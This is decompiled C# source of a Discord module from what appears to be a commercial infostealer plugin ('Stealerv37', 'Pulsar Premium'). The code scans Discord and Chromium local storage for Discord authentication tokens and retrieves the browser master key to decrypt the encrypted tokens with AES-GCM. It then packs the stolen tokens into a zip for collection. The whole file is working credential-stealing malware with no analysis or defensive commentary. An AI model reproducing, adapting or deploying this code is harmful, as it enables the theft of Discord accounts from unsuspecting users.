// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Discord
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Discord : ITarget
{
  private static readonly Regex _tokenRegex = new Regex("(mfa\\.[\\w-]{80,})|((MT|OD)[\\w-]{22,24}\\.[\\w-]{6}\\.[\\w-]{25,110})", RegexOptions.IgnoreCase | RegexOptions.Compiled);
  private static readonly Regex _encryptedRegex = new Regex("\"dQw4w9WgXcQ:([^\"]+)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled);

  public void Collect(InMemoryZip zip, Counter counter)
  {
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Discord);
    counterApplications.Files.Add("Discord\\");
    Task.WaitAll(Task.Run((Action) (() => Parallel.ForEach<string>((IEnumerable<string>) Paths.Discord, (Action<string>) (path =>
    {
      string str = path + "\\Local Storage\\leveldb";
      if (!Directory.Exists(str))
        return;
      string localstate = path + "\\Local State";
      List<string> stringList = this.TokensGrabber(str, localstate);
      if (!stringList.Any<string>())
        return;
      string entryPath = $"Discord\\{Paths.GetBrowserName(path)}.txt";
      counterApplications.Files.Add($"{path} => {entryPath}");
      zip.AddTextFile(entryPath, string.Join("\n", (IEnumerable<string>) stringList));
    })))), Task.Run((Action) (() => Parallel.ForEach<string>((IEnumerable<string>) Paths.Chromium, (Action<string>) (path =>
    {
      if (!Directory.Exists(path))
        return;
      Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(path), (Action<string>) (profile =>
      {
        string str = profile + "\\Local Storage\\leveldb";
        if (!Directory.Exists(str))
          return;
        string localstate = path + "\\Local State";
        List<string> stringList = this.TokensGrabber(str, localstate);
        if (!stringList.Any<string>())
          return;
        string entryPath = $"Discord\\{Paths.GetBrowserName(path)} {Path.GetFileName(profile)}.txt";
        counterApplications.Files.Add($"{path} => {entryPath}");
        zip.AddTextFile(entryPath, string.Join("\n", (IEnumerable<string>) stringList));
      }));
    })))));
    if (counterApplications.Files.Count<string>() <= 0)
      return;
    counter.Messangers.Add(counterApplications);
  }

  private List<string> TokensGrabber(string localstorage, string localstate)
  {
    List<string> source = this.SearchFiles(localstorage);
    ConcurrentBag<string> tokens = new ConcurrentBag<string>();
    ConcurrentBag<string> tokensEncrypted = new ConcurrentBag<string>();
    Action<string> body = (Action<string>) (localdb =>
    {
      try
      {
        string content = File.ReadAllText(localdb);
        Parallel.ForEach<string>((IEnumerable<string>) this.SearchToken(content), (Action<string>) (token => tokens.Add(token)));
        Parallel.ForEach<string>((IEnumerable<string>) this.SearchEncryptedTokens(content), (Action<string>) (token => tokensEncrypted.Add(token)));
      }
      catch
      {
      }
    });
    Parallel.ForEach<string>((IEnumerable<string>) source, body);
    ConcurrentBag<string> distinctTokens = new ConcurrentBag<string>(tokens.Distinct<string>());
    if (!tokensEncrypted.Any<string>())
      return distinctTokens.Distinct<string>().ToList<string>();
    byte[] key = LocalState.MasterKeyV10(localstate);
    if (key == null)
      return distinctTokens.Distinct<string>().ToList<string>();
    Parallel.ForEach<string>(tokensEncrypted.Distinct<string>(), (Action<string>) (encrypted =>
    {
      try
      {
        byte[] bytes = AesGcm.DecryptBrowser(Convert.FromBase64String(encrypted), key, (byte[]) null, false);
        if (bytes == null)
          return;
        distinctTokens.Add(Encoding.UTF8.GetString(bytes).Trim());
      }
      catch
      {
      }
    }));
    return distinctTokens.Distinct<string>().ToList<string>();
  }

  private List<string> SearchFiles(string path)
  {
    ConcurrentBag<string> locals = new ConcurrentBag<string>();
    string[] allowedExtensions = new string[3]
    {
      ".log",
      ".ldb",
      ".sqlite"
    };
    Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(path), (Action<string>) (file =>
    {
      if (!((IEnumerable<string>) allowedExtensions).Contains<string>(Path.GetExtension(file)))
        return;
      locals.Add(file);
    }));
    return locals.ToList<string>();
  }

  private List<string> ExtractMatches(string content, Regex regex)
  {
    HashSet<string> source = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    foreach (Match match in regex.Matches(content))
    {
      string str = match.Groups[1].Value;
      if (!string.IsNullOrWhiteSpace(str))
        source.Add(str);
    }
    return source.ToList<string>();
  }

  private List<string> SearchToken(string content)
  {
    return this.ExtractMatches(content, Discord._tokenRegex);
  }

  private List<string> SearchEncryptedTokens(string content)
  {
    return this.ExtractMatches(content, Discord._encryptedRegex);
  }
}
